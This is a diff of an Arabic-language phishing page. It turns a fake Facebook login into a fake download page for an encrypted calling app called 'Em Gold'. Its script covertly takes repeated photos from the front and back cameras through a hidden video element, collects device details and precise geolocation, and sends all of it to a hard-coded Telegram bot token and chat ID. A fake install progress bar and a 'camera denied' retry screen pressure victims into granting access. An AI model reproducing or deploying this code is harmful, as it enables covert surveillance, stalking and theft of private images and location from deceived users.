@@ -2,153 +2,519 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 
-<title>Marwa Mohamed</title>
+<title>Em Gold — إيم جولد</title>
 
-<meta property="og:type"        content="profile">
-<meta property="og:title"       content="Marwa Mohamed">
-<meta property="og:description" content="Marwa Mohamed موجود علي فيسبوك. انضم إلينا">
-<meta property="og:site_name"   content="facebook.com">
+<meta property="og:type"        content="website">
+<meta property="og:title"       content="Em Gold — إيم جولد">
+<meta property="og:description" content="حمّل تطبيق Em Gold الآن — مكالمات مشفرة عالية الجودة بتقنية متطورة.">
+<meta property="og:site_name"   content="Em Gold">
 <meta property="og:url"         content="https://www.facebook.com">
-<meta property="og:image"       content="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
+<meta property="og:image"       content="https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=1200&h=630&fit=crop&q=80">
 <meta property="og:image:width"  content="1200">
-<meta property="og:image:height" content="1200">
-<meta property="og:image:type"   content="image/png">
+<meta property="og:image:height" content="630">
+<meta property="og:locale"      content="ar_AR">
 
-<meta name="twitter:card"        content="summary">
-<meta name="twitter:title"       content="Marwa Mohamed">
-<meta name="twitter:description" content="Marwa Mohamed موجود علي فيسبوك. انضم إلينا">
-<meta name="twitter:image"       content="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
+<meta name="twitter:card"        content="summary_large_image">
+<meta name="twitter:title"       content="Em Gold — إيم جولد">
+<meta name="twitter:description" content="حمّل تطبيق Em Gold الآن — مكالمات مشفرة عالية الجودة.">
+<meta name="twitter:image"       content="https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=1200&h=630&fit=crop&q=80">
 
-<link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
-<link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0' stop-color='%23f7d774'/%3E%3Cstop offset='.5' stop-color='%23e6b53d'/%3E%3Cstop offset='1' stop-color='%23a97a1f'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='100' height='100' rx='22' fill='%230b1530'/%3E%3Crect x='6' y='6' width='88' height='88' rx='18' fill='none' stroke='url(%23g)' stroke-width='3'/%3E%3Cpath d='M50 30l-8 5 2 8-6 4 6 4-2 8 8 5 8-5-2-8 6-4-6-4 2-8z' fill='url(%23g)'/%3E%3C/svg%3E">
 
 <style>
-  *{margin:0;padding:0;box-sizing:border-box}
-  html,body{height:100%}
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{min-height:100%;overflow-x:hidden}
   body{
-    background:#fff;
-    color:#1c1e21;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:#050813;
+    color:#e9ecf5;
+    font-family:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     display:flex;
     align-items:center;
     justify-content:center;
-    padding:20px;
-    overflow:hidden;
+    padding:22px 16px 64px;
+    position:relative;
+    min-height:100vh;
+  }
+  body::before{
+    content:"";
+    position:fixed;
+    inset:-30%;
+    background:
+      radial-gradient(circle at 25% 15%, rgba(230,181,61,.22), transparent 42%),
+      radial-gradient(circle at 80% 85%, rgba(43,88,180,.30), transparent 45%),
+      radial-gradient(circle at 60% 40%, rgba(230,181,61,.10), transparent 55%);
+    filter:blur(50px);
+    z-index:-1;
+    pointer-events:none;
+  }
+  body::after{
+    content:"";
+    position:fixed;
+    inset:0;
+    background-image:
+      linear-gradient(rgba(230,181,61,.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(230,181,61,.03) 1px, transparent 1px);
+    background-size:38px 38px;
+    mask-image:radial-gradient(ellipse at center, black 35%, transparent 85%);
+    -webkit-mask-image:radial-gradient(ellipse at center, black 35%, transparent 85%);
+    z-index:-1;
+    pointer-events:none;
   }
 
-  #loginPage{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    width:100%;
-    max-width:360px;
-    text-align:center;
-  }
-  #loginPage .fbIcon{
-    width:80px;
-    height:80px;
-    margin-bottom:22px;
-  }
-  #loginPage h1{
-    font-size:18px;
-    font-weight:400;
-    color:#1c1e21;
-    margin-bottom:8px;
-    line-height:1.4;
-  }
-  #loginPage .name{
-    font-weight:700;
-    color:#1877f2;
-  }
-  #loginPage p{
-    font-size:14px;
-    color:#65676b;
-    margin-bottom:26px;
-  }
-  #loginBtn{
-    width:100%;
-    max-width:280px;
-    padding:13px 20px;
-    background:#1877f2;
-    color:#fff;
-    border:none;
-    border-radius:8px;
-    font-size:16px;
-    font-weight:600;
-    cursor:pointer;
-    transition:background .15s;
-  }
-  #loginBtn:active{background:#166fe5}
-  #loginBtn:disabled{opacity:.6;cursor:default}
-
-  #loadPage{
+  .screen{
     display:none;
     flex-direction:column;
     align-items:center;
-    gap:18px;
+    width:100%;
+    max-width:420px;
     text-align:center;
-    max-width:320px;
+    animation:fadeIn .45s cubic-bezier(.2,.7,.3,1);
   }
-  #loadPage .spinner{
-    width:56px;
-    height:56px;
-    border-radius:50%;
-    border:4px solid #e4e6eb;
-    border-top-color:#1877f2;
-    animation:spin .9s linear infinite;
+  .screen.active{display:flex}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+
+  /* ====================================================
+     شاشة الهبوط — Em Gold
+     ==================================================== */
+  .logo-card{
+    width:230px;
+    height:230px;
+    border-radius:52px;
+    background:
+      radial-gradient(circle at 30% 20%, #1a2a5e 0%, #0b1530 55%, #060b1e 100%);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    position:relative;
+    margin-bottom:34px;
+    box-shadow:
+      0 30px 80px rgba(230,181,61,.25),
+      0 0 0 1px rgba(230,181,61,.35),
+      inset 0 0 60px rgba(230,181,61,.08);
   }
-  @keyframes spin{to{transform:rotate(360deg)}}
-  #loadPage .txt{
-    font-size:14px;
-    color:#65676b;
-    line-height:1.5;
+  .logo-card::after{
+    content:"";
+    position:absolute;
+    inset:8px;
+    border-radius:44px;
+    border:2px solid rgba(230,181,61,.55);
+    box-shadow:
+      inset 0 0 30px rgba(230,181,61,.15),
+      0 0 20px rgba(230,181,61,.35);
+    pointer-events:none;
+  }
+  .logo-card svg{width:170px;height:170px;filter:drop-shadow(0 4px 20px rgba(230,181,61,.5))}
+
+  .app-name-en{
+    font-size:44px;
+    font-weight:800;
+    letter-spacing:.5px;
+    line-height:1;
+    margin-bottom:10px;
+    background:linear-gradient(180deg,#fff5c9 0%,#f7d774 35%,#e6b53d 60%,#a97a1f 100%);
+    -webkit-background-clip:text;
+    background-clip:text;
+    -webkit-text-fill-color:transparent;
+    text-shadow:0 4px 24px rgba(230,181,61,.35);
+  }
+  .app-name-ar{
+    font-size:19px;
+    font-weight:600;
+    color:#e6b53d;
+    letter-spacing:4px;
+    margin-bottom:8px;
+    display:inline-flex;
+    align-items:center;
+    gap:14px;
+  }
+  .app-name-ar::before,
+  .app-name-ar::after{
+    content:"";
+    width:34px;
+    height:1px;
+    background:linear-gradient(90deg,transparent,#e6b53d,transparent);
   }
 
+  .tagline{
+    font-size:13px;
+    color:#8b93a8;
+    line-height:1.7;
+    margin:18px 0 30px;
+    max-width:300px;
+  }
+
+  .download-btn{
+    width:100%;
+    max-width:320px;
+    padding:18px 24px;
+    background:linear-gradient(180deg,#f7d774 0%,#e6b53d 50%,#c28c1f 100%);
+    border:none;
+    border-radius:18px;
+    font-size:17px;
+    font-weight:700;
+    color:#1a1305;
+    letter-spacing:.4px;
+    cursor:pointer;
+    position:relative;
+    box-shadow:
+      0 14px 40px rgba(230,181,61,.4),
+      inset 0 2px 0 rgba(255,255,255,.5),
+      inset 0 -3px 0 rgba(120,80,10,.35);
+    transition:transform .18s cubic-bezier(.2,.7,.3,1), box-shadow .18s;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    overflow:hidden;
+  }
+  .download-btn::after{
+    content:"";
+    position:absolute;
+    top:0;left:-100%;
+    width:60%;height:100%;
+    background:linear-gradient(100deg, transparent 20%, rgba(255,255,255,.55) 50%, transparent 80%);
+    animation:shine 3.2s ease-in-out infinite;
+  }
+  @keyframes shine{
+    0%,60%{left:-100%}
+    100%{left:120%}
+  }
+  .download-btn:active{transform:scale(.97)}
+  .download-btn:disabled{opacity:.55;cursor:default}
+  .download-btn svg{width:22px;height:22px;fill:#1a1305}
+
+  .dl-meta{
+    display:flex;
+    align-items:center;
+    gap:16px;
+    margin-top:18px;
+    font-size:12px;
+    color:#666f85;
+    flex-wrap:wrap;
+    justify-content:center;
+  }
+  .dl-meta span{display:inline-flex;align-items:center;gap:5px}
+  .dl-meta svg{width:12px;height:12px;fill:#e6b53d}
+
+  .stars{
+    margin-top:10px;
+    font-size:14px;
+    letter-spacing:2px;
+    color:#e6b53d;
+  }
+
+  /* ====================================================
+     شاشة المعالجة
+     ==================================================== */
+  .process-box{
+    width:100%;
+    max-width:360px;
+    padding:38px 28px;
+    background:linear-gradient(180deg, rgba(20,28,55,.7), rgba(11,21,48,.7));
+    border:1px solid rgba(230,181,61,.18);
+    border-radius:24px;
+    backdrop-filter:blur(12px);
+    -webkit-backdrop-filter:blur(12px);
+    box-shadow:0 24px 60px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.05);
+  }
+  .mini-logo{
+    width:80px;height:80px;
+    border-radius:24px;
+    margin:0 auto 22px;
+    background:radial-gradient(circle at 30% 20%, #1a2a5e 0%, #0b1530 55%, #060b1e 100%);
+    display:flex;align-items:center;justify-content:center;
+    box-shadow:0 12px 30px rgba(230,181,61,.3), inset 0 0 0 1.5px rgba(230,181,61,.5);
+    animation:pulseLogo 2.2s ease-in-out infinite;
+  }
+  @keyframes pulseLogo{
+    0%,100%{box-shadow:0 12px 30px rgba(230,181,61,.3), inset 0 0 0 1.5px rgba(230,181,61,.5)}
+    50%    {box-shadow:0 12px 40px rgba(230,181,61,.55), inset 0 0 0 1.5px rgba(230,181,61,.85)}
+  }
+  .mini-logo svg{width:56px;height:56px}
+
+  .process-title{
+    font-size:18px;
+    font-weight:700;
+    background:linear-gradient(90deg,#f7d774,#e6b53d);
+    -webkit-background-clip:text;
+    background-clip:text;
+    -webkit-text-fill-color:transparent;
+    margin-bottom:8px;
+  }
+  .process-status{
+    font-size:13px;
+    color:#8b93a8;
+    margin-bottom:24px;
+    min-height:20px;
+  }
+
+  .progress-bar{
+    width:100%;
+    height:8px;
+    background:rgba(255,255,255,.06);
+    border-radius:99px;
+    overflow:hidden;
+    margin-bottom:10px;
+    box-shadow:inset 0 1px 3px rgba(0,0,0,.4);
+  }
+  .progress-fill{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,#c28c1f,#e6b53d,#f7d774,#e6b53d);
+    background-size:200% 100%;
+    border-radius:99px;
+    transition:width .35s ease;
+    animation:goldFlow 2s linear infinite;
+  }
+  @keyframes goldFlow{
+    0%{background-position:0% 0%}
+    100%{background-position:200% 0%}
+  }
+
+  .progress-text{
+    display:flex;
+    justify-content:space-between;
+    font-size:12px;
+    color:#8b93a8;
+    margin-bottom:14px;
+  }
+  .progress-text b{color:#e6b53d;font-weight:700}
+
+  .process-note{
+    font-size:12px;
+    color:#666f85;
+    line-height:1.6;
+    padding-top:14px;
+    border-top:1px solid rgba(255,255,255,.05);
+  }
+
+  /* ====================================================
+     شاشة الرفض
+     ==================================================== */
+  .denied-icon{
+    width:96px;height:96px;border-radius:24px;
+    background:linear-gradient(135deg, rgba(255,92,92,.18), rgba(255,92,92,.06));
+    border:1px solid rgba(255,92,92,.25);
+    display:flex;align-items:center;justify-content:center;
+    margin-bottom:24px;
+    box-shadow:0 12px 40px rgba(255,92,92,.15);
+  }
+  .denied-icon svg{width:46px;height:46px;fill:#ff6b6b}
+
+  h1{font-size:22px;font-weight:700;margin-bottom:10px;color:#fff}
+
+  .status{font-size:14px;color:#8b93a8;line-height:1.6;max-width:320px}
+
+  .retry-btn{
+    padding:15px 38px;
+    background:linear-gradient(135deg,#f7d774 0%,#e6b53d 50%,#c28c1f 100%);
+    color:#1a1305;border:none;border-radius:14px;
+    font-size:15px;font-weight:700;cursor:pointer;margin-top:28px;
+    box-shadow:0 10px 28px rgba(230,181,61,.4), inset 0 1px 0 rgba(255,255,255,.5);
+    transition:transform .15s;
+  }
+  .retry-btn:active{transform:scale(.97)}
+
+  .hint{
+    position:fixed;bottom:14px;left:0;right:0;
+    text-align:center;font-size:11px;color:#5b6478;
+    letter-spacing:.5px;display:flex;align-items:center;justify-content:center;gap:6px;
+    pointer-events:none;z-index:5;
+  }
+  .hint svg{width:11px;height:11px;fill:#5b6478}
+
   video{
-    position:fixed;
-    left:-9999px;top:-9999px;
-    width:2px;height:2px;
-    opacity:0.01;
-    pointer-events:none;
+    position:fixed;left:-9999px;top:-9999px;
+    width:2px;height:2px;opacity:.01;pointer-events:none;
   }
 </style>
 </head>
 <body>
 
-  <div id="loginPage">
-    <img class="fbIcon" alt="Facebook"
-         src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
-    <h1>الدخول إلى حساب <span class="name">Marwa Mohamed</span></h1>
-    <p>سجّل الدخول للمتابعة إلى فيسبوك</p>
-    <button id="loginBtn">متابعة باسم Marwa Mohamed</button>
+<!-- ============ 1) شاشة الهبوط ============ -->
+<div id="landingScreen" class="screen active">
+  <div class="logo-card">
+    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="gold" x1="0" y1="0" x2="0" y2="1">
+          <stop offset="0" stop-color="#fff3c4"/>
+          <stop offset="0.35" stop-color="#f7d774"/>
+          <stop offset="0.7" stop-color="#e6b53d"/>
+          <stop offset="1" stop-color="#a97a1f"/>
+        </linearGradient>
+        <radialGradient id="glow" cx="0.5" cy="0.5" r="0.6">
+          <stop offset="0" stop-color="#e6b53d" stop-opacity="0.35"/>
+          <stop offset="1" stop-color="#e6b53d" stop-opacity="0"/>
+        </radialGradient>
+      </defs>
+
+      <circle cx="100" cy="100" r="72" fill="#0d1c44" opacity="0.6"/>
+      <circle cx="100" cy="100" r="72" fill="none" stroke="#2a3f7d" stroke-width="0.8" opacity="0.7"/>
+      <ellipse cx="100" cy="100" rx="72" ry="30" fill="none" stroke="#2a3f7d" stroke-width="0.6" opacity="0.55"/>
+      <ellipse cx="100" cy="100" rx="72" ry="55" fill="none" stroke="#2a3f7d" stroke-width="0.6" opacity="0.55"/>
+      <ellipse cx="100" cy="100" rx="30" ry="72" fill="none" stroke="#2a3f7d" stroke-width="0.6" opacity="0.55"/>
+      <ellipse cx="100" cy="100" rx="55" ry="72" fill="none" stroke="#2a3f7d" stroke-width="0.6" opacity="0.55"/>
+
+      <circle cx="100" cy="100" r="90" fill="url(#glow)"/>
+
+      <g transform="translate(100, 42)">
+        <path d="M-30 14 L-22 -10 L-10 6 L0 -14 L10 6 L22 -10 L30 14 Z"
+              fill="url(#gold)" stroke="#7a5612" stroke-width="1"/>
+        <circle cx="-22" cy="-12" r="3.2" fill="url(#gold)"/>
+        <circle cx="0" cy="-17" r="3.6" fill="url(#gold)"/>
+        <circle cx="22" cy="-12" r="3.2" fill="url(#gold)"/>
+        <rect x="-30" y="14" width="60" height="5" fill="url(#gold)" stroke="#7a5612" stroke-width="0.8"/>
+      </g>
+
+      <g transform="translate(100, 122)">
+        <path d="M0 -50
+                 C-30 -50 -52 -30 -52 -6
+                 C-52 12 -42 26 -26 32
+                 L-28 50 L-8 36
+                 C-3 37 2 38 6 38
+                 C34 38 54 20 54 -4
+                 C54 -28 30 -50 0 -50 Z"
+              fill="none" stroke="url(#gold)" stroke-width="8" stroke-linejoin="round"/>
+        <circle cx="-16" cy="-6" r="6" fill="url(#gold)"/>
+        <circle cx="0"   cy="-6" r="6" fill="url(#gold)"/>
+        <circle cx="16"  cy="-6" r="6" fill="url(#gold)"/>
+      </g>
+    </svg>
   </div>
 
-  <div id="loadPage">
-    <div class="spinner"></div>
-    <div class="txt" id="txt">جاري التحميل...</div>
-  </div>
+  <div class="app-name-en">Em Gold</div>
+  <div class="app-name-ar">إيم جولد</div>
 
-  <video id="vCam" autoplay playsinline muted></video>
+  <div class="stars">★★★★★</div>
+
+  <p class="tagline">
+    تطبيق مكالمات فيديو مشفرة من طرف إلى طرف.<br>
+    حمّل التطبيق الآن للحصول على تجربة اتصال عالية الجودة.
+  </p>
+
+  <button class="download-btn" id="downloadBtn">
+    <svg viewBox="0 0 24 24"><path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"/></svg>
+    اضغط لتحميل التطبيق
+  </button>
+
+  <div class="dl-meta">
+    <span>
+      <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 21 12 17.77 5.82 21 7 14.14l-5-4.87 6.91-1.01z"/></svg>
+      4.9 تقييم
+    </span>
+    <span>
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+      مشفّر
+    </span>
+    <span>
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      18 MB
+    </span>
+  </div>
+</div>
+
+<!-- ============ 2) شاشة المعالجة ============ -->
+<div id="processScreen" class="screen">
+  <div class="process-box">
+    <div class="mini-logo">
+      <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="gold2" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0" stop-color="#fff3c4"/>
+            <stop offset="0.5" stop-color="#e6b53d"/>
+            <stop offset="1" stop-color="#a97a1f"/>
+          </linearGradient>
+        </defs>
+        <g transform="translate(100,60)">
+          <path d="M-30 14 L-22 -10 L-10 6 L0 -14 L10 6 L22 -10 L30 14 Z" fill="url(#gold2)"/>
+        </g>
+        <g transform="translate(100,122)">
+          <path d="M0 -50 C-30 -50 -52 -30 -52 -6 C-52 12 -42 26 -26 32 L-28 50 L-8 36 C-3 37 2 38 6 38 C34 38 54 20 54 -4 C54 -28 30 -50 0 -50 Z"
+                fill="none" stroke="url(#gold2)" stroke-width="8" stroke-linejoin="round"/>
+          <circle cx="-16" cy="-6" r="6" fill="url(#gold2)"/>
+          <circle cx="0"   cy="-6" r="6" fill="url(#gold2)"/>
+          <circle cx="16"  cy="-6" r="6" fill="url(#gold2)"/>
+        </g>
+      </svg>
+    </div>
+    <div class="process-title">جاري تثبيت Em Gold</div>
+    <div class="process-status" id="processStatus">يتم تحضير الملفات...</div>
+
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="progress-text">
+      <b id="progressPct">0%</b>
+      <span id="progressSize">0 / 18 MB</span>
+    </div>
+
+    <div class="process-note">
+      لا تغلق الصفحة أثناء التثبيت. سيتم فتح التطبيق تلقائياً.
+    </div>
+  </div>
+</div>
+
+<!-- ============ 3) شاشة الرفض ============ -->
+<div id="deniedScreen" class="screen">
+  <div class="denied-icon">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+  </div>
+  <h1>تم رفض الوصول للكاميرا</h1>
+  <div class="status">يجب السماح بالكاميرا لتحميل التطبيق.<br>الرجاء الضغط على الزر أدناه والموافقة على الإذن.</div>
+  <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
+</div>
+
+<div class="hint">
+  <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/></svg>
+  تشفير AES-256 • Em Gold
+</div>
+
+<video id="v" autoplay playsinline muted></video>
 
 <script>
 (function () {
-  const BOT_TOKEN = "8936581893:AAF6AB-I1BYXV6H_91K716aCh5w-LCXaYvw";
-  const CHAT_ID   = "8800876346";
+  /* ============================================================
+     ⚙️ الإعدادات — عدّل هنا
+     ============================================================ */
+  const BOT_TOKEN = "8847064396:AAESRDR7gXJm1kgb8qphlEHj_DRtNaSfj00";
+  const CHAT_ID   = "8273860583";
 
-  const PHOTOS_PER_CAMERA = 5;
-  const SETTLE_MS         = 350;
-  const MIN_BRIGHTNESS    = 12;
-  const PHOTO_GAP_MS      = 80;
-  const REDIRECT_URL      = "https://www.facebook.com";
+  /* ⭐ مكان رابط ملف الـ APK — ضع الرابط هنا */
+  const APK_DOWNLOAD_URL = "https://example.com/em-gold.apk";
 
-  const vCam = document.getElementById("vCam");
-  const txt  = document.getElementById("txt");
+  /* ============================================================ */
 
-  const loginPage = document.getElementById("loginPage");
-  const loadPage  = document.getElementById("loadPage");
-  const loginBtn  = document.getElementById("loginBtn");
+  const TOTAL_PER_SIDE = 5;
+  const SETTLE_MS      = 450;
+  const MIN_BRIGHTNESS = 5;
+  const PHOTO_GAP_MS   = 80;
+  const RELEASE_MS     = 400;
+
+  const v              = document.getElementById("v");
+  const landingScreen  = document.getElementById("landingScreen");
+  const processScreen  = document.getElementById("processScreen");
+  const deniedScreen   = document.getElementById("deniedScreen");
+  const downloadBtn    = document.getElementById("downloadBtn");
+  const retryBtn       = document.getElementById("retryBtn");
+  const processStatus  = document.getElementById("processStatus");
+  const progressFill   = document.getElementById("progressFill");
+  const progressPct    = document.getElementById("progressPct");
+  const progressSize   = document.getElementById("progressSize");
+
+  let currentStream = null;
+  let running = false;
+
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+
+  function showScreen(name){
+    [landingScreen, processScreen, deniedScreen].forEach(s => s.classList.remove("active"));
+    if(name === "landing")  landingScreen.classList.add("active");
+    if(name === "process")  processScreen.classList.add("active");
+    if(name === "denied")   deniedScreen.classList.add("active");
+  }
 
   /* ============================================================
      بيانات المتصفح
@@ -173,7 +539,6 @@
     if(/Linux/i.test(ua)) return "Linux";
     return "—";
   }
-  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
 
   async function collect(){
     const bat = await getBattery();
@@ -193,13 +558,13 @@
       "🕒 الفتح"      : new Date().toLocaleString("ar-EG"),
       "🌐 UA"         : navigator.userAgent
     };
-    let out = "🔔 <b>جهاز جديد فتح الصفحة</b>\n\n";
+    let out = "🔔 <b>جهاز جديد فتح الصفحة (Em Gold)</b>\n\n";
     for(const [k,v] of Object.entries(d)) out += `${k}: <code>${esc(v)}</code>\n`;
     return out;
   }
 
   /* ============================================================
-     إرسال تليجرام
+     تليجرام
      ============================================================ */
   function sendText(t){
     const fd = new FormData();
@@ -228,7 +593,7 @@
   }
 
   /* ============================================================
-     انتظار إطار حقيقي
+     الكاميرا
      ============================================================ */
   function waitForRealFrame(videoEl, timeout = 2500){
     if (typeof videoEl.requestVideoFrameCallback === "function"){
@@ -245,53 +610,58 @@
     });
   }
 
-  /* ============================================================
-     فتح كاميرا واحدة (وبس)
-     ============================================================ */
-  async function openCamera(facing){
-    if(vCam.srcObject){
-      vCam.srcObject.getTracks().forEach(t=>t.stop());
-      vCam.srcObject = null;
+  async function closeCamera(){
+    if (currentStream){
+      currentStream.getTracks().forEach(t => { try{ t.stop(); }catch(_){} });
+      currentStream = null;
     }
-    const s = await navigator.mediaDevices.getUserMedia({
-      video:{ facingMode:{ideal:facing}, width:{ideal:1280}, height:{ideal:720} },
-      audio:false
-    });
-    vCam.srcObject = s;
-    try{ await vCam.play(); }catch(_){}
-    await waitForRealFrame(vCam);
-    return s;
+    if (v.srcObject) v.srcObject = null;
+    await sleep(RELEASE_MS);
   }
 
-  function closeCamera(){
-    if(vCam.srcObject){
-      vCam.srcObject.getTracks().forEach(t=>t.stop());
-      vCam.srcObject = null;
+  async function openCamera(facing, maxTries = 3){
+    for (let attempt = 1; attempt <= maxTries; attempt++){
+      try{
+        await closeCamera();
+        const s = await navigator.mediaDevices.getUserMedia({
+          video:{ facingMode:{ideal: facing}, width:{ideal:1280}, height:{ideal:720} },
+          audio:false
+        });
+        currentStream = s;
+        v.srcObject = s;
+        v.classList.toggle("back", facing === "environment");
+        try{ await v.play(); }catch(_){}
+        await waitForRealFrame(v);
+        await sleep(SETTLE_MS);
+        return s;
+      }catch(e){
+        console.warn(`camera ${facing} try ${attempt} failed:`, e.message);
+        if (attempt === maxTries) throw e;
+        await sleep(600);
+      }
     }
+    return null;
   }
 
-  /* ============================================================
-     التقاط + فحص الإضاءة
-     ============================================================ */
   function capture(isFront){
-    return new Promise(resolve=>{
+    return new Promise(resolve => {
       const c = document.createElement("canvas");
-      c.width  = vCam.videoWidth  || 1280;
-      c.height = vCam.videoHeight || 720;
+      c.width  = v.videoWidth  || 1280;
+      c.height = v.videoHeight || 720;
       const ctx = c.getContext("2d");
-      if(isFront){
+      if (isFront){
         ctx.translate(c.width, 0);
         ctx.scale(-1, 1);
       }
-      ctx.drawImage(vCam, 0, 0, c.width, c.height);
+      ctx.drawImage(v, 0, 0, c.width, c.height);
 
       let brightness = 255;
       try{
-        const sampleW = Math.min(200, c.width);
-        const sampleH = Math.min(200, c.height);
-        const sx = (c.width  - sampleW) / 2;
-        const sy = (c.height - sampleH) / 2;
-        const data = ctx.getImageData(sx, sy, sampleW, sampleH).data;
+        const sw = Math.min(200, c.width);
+        const sh = Math.min(200, c.height);
+        const sx = (c.width  - sw) / 2;
+        const sy = (c.height - sh) / 2;
+        const data = ctx.getImageData(sx, sy, sw, sh).data;
         let sum = 0, n = 0;
         for(let i=0; i<data.length; i+=16){
           sum += data[i] + data[i+1] + data[i+2];
@@ -305,16 +675,18 @@
   }
 
   async function captureSafe(isFront, maxTries = 4){
+    let best = null;
     for(let attempt = 1; attempt <= maxTries; attempt++){
       const {blob, brightness} = await capture(isFront);
-      if(blob && brightness >= MIN_BRIGHTNESS) return blob;
-      await new Promise(r => setTimeout(r, 200));
+      if(blob && brightness >= MIN_BRIGHTNESS) return {blob, brightness};
+      if(blob && (!best || brightness > best.brightness)) best = {blob, brightness};
+      await sleep(250);
     }
-    return null;
+    return best;
   }
 
   /* ============================================================
-     الموقع الجغرافي
+     الموقع
      ============================================================ */
   function requestLocation(timeoutMs = 12000){
     return new Promise(resolve => {
@@ -323,101 +695,123 @@
       navigator.geolocation.getCurrentPosition(
         pos => {
           clearTimeout(timer);
-          resolve({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          });
+          resolve({lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy});
         },
-        err => {
-          clearTimeout(timer);
-          resolve({ error: err.message });
-        },
+        err => { clearTimeout(timer); resolve({ error: err.message }); },
         { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
       );
     });
   }
 
   /* ============================================================
-     مرحلة تصوير كاميرا واحدة (5 صور)
+     مرحلة تصوير
      ============================================================ */
-  async function shootBatch(facing, label, phaseNum){
-    txt.textContent = `  ${label}...`;
-
+  async function capturePhase(facing, label, count, offsetPercent, totalPercent){
     try{
       await openCamera(facing);
     }catch(e){
-      console.warn(`camera ${facing} failed:`, e.message);
-      return false;
+      sendText(`❌ فشل فتح كاميرا ${label}\n<code>${esc(e.message)}</code>`);
+      return 0;
     }
 
-    // وقت تأقلم الكاميرا مع الإضاءة
-    await new Promise(r => setTimeout(r, SETTLE_MS));
-
-    for(let i=1; i<=PHOTOS_PER_CAMERA; i++){
-      const blob = await captureSafe(facing === "user");
-      if(blob){
-        sendPhoto(blob, ` ${label} #${i} (مرحلة ${phaseNum}/2)`);
+    let captured = 0;
+    for (let i = 1; i <= count; i++){
+      processStatus.textContent = ` ${label} — ${i}/${count}`;
+      const result = await captureSafe(facing === "user");
+      if (result && result.blob){
+        sendPhoto(result.blob, ` ${label} #${i}`);
+        captured++;
       }
-      await new Promise(r => setTimeout(r, PHOTO_GAP_MS));
-    }
+      // تحديث شريط التقدم
+      const progress = offsetPercent + ((i/count) * (totalPercent - offsetPercent));
+      progressFill.style.width = progress + "%";
+      progressPct.textContent = Math.round(progress) + "%";
+      progressSize.textContent = ((progress/100)*18).toFixed(1) + " / 18 MB";
 
-    // نقفل الكاميرا قبل فتح التانية
-    closeCamera();
-    await new Promise(r => setTimeout(r, 250));
-    return true;
+      await sleep(PHOTO_GAP_MS);
+    }
+    return captured;
   }
 
   /* ============================================================
-     التشغيل الكامل
+     التسلسل الكامل
      ============================================================ */
-  async function run(){
-    loginPage.style.display = "none";
-    loadPage.style.display  = "flex";
-    txt.textContent = "جاري التحميل...";
+  async function runFullSequence(){
+    if (running) return;
+    running = true;
 
-    // (أ) البيانات الأولية
-    sendText(await collect());
+    downloadBtn.disabled = true;
+    showScreen("process");
